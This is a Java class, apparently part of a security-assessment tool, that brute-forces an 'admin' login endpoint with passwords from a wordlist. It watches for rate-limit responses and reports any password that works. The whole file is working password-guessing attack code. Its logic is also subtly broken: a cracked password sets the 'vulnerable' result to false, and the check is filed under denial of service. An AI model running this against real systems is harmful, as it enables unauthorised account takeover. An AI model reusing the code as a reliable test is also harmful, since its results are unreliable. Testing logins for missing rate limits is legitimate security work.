package attacks;

import config.AttackConfig;
import model.AttackResult;
import model.StrideCategory;
import util.HttpUtil;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class BruteForceAttack {

    public static AttackResult run(AttackConfig config) {

        String endpoint = config.loginEndpoint;
        String url = config.targetUrl + endpoint;

        List<String> passwords = loadPasswords(config.passwordsFile, config.maxPasswords);

        if (passwords.isEmpty()) {
            return new AttackResult("Brute Force", false,
                "ERROR: Could not load passwords file: " + config.passwordsFile,
                StrideCategory.DENIAL_OF_SERVICE, "BruteForceAttack", endpoint);
        }

        int attempts = passwords.size();
        int successCount = 0;
        int blockedAt = -1;
        String successPassword = null;

        for (int i = 0; i < attempts; i++) {
            String payload = String.format("""
            {
              "username": "admin",
              "password": "%s"
            }
            """, passwords.get(i));

            String response = HttpUtil.post(url, payload);

            if (response.contains("blocked") || response.contains("too many") ||
                response.contains("rate limit") || response.contains("429")) {
                blockedAt = i + 1;
                break;
            }

            if (response.contains("success") || response.contains("token")) {
                successPassword = passwords.get(i);
                break;
            }

            successCount++;
        }

        boolean vulnerable = (blockedAt == -1 && successPassword == null);

        String details;
        if (successPassword != null) {
            details = String.format("Password cracked: '%s' after %d attempts",
                successPassword, successCount + 1);
        } else if (blockedAt > 0) {
            details = String.format("Rate limiting detected. Blocked after %d attempts", blockedAt);
        } else {
            details = String.format("No rate limiting. Tested %d passwords without blocking", attempts);
        }

        return new AttackResult("Brute Force", vulnerable, details,
            StrideCategory.DENIAL_OF_SERVICE, "BruteForceAttack", endpoint);
    }

    private static List<String> loadPasswords(String filename, int limit) {
        List<String> passwords = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new FileReader(filename))) {
            String line;
            while ((line = reader.readLine()) != null && passwords.size() < limit) {
                line = line.trim();
                if (!line.isEmpty()) passwords.add(line);
            }
        } catch (IOException e) {
            System.err.println("Warning: Could not read " + filename + ": " + e.getMessage());
        }
        return passwords;
    }
}
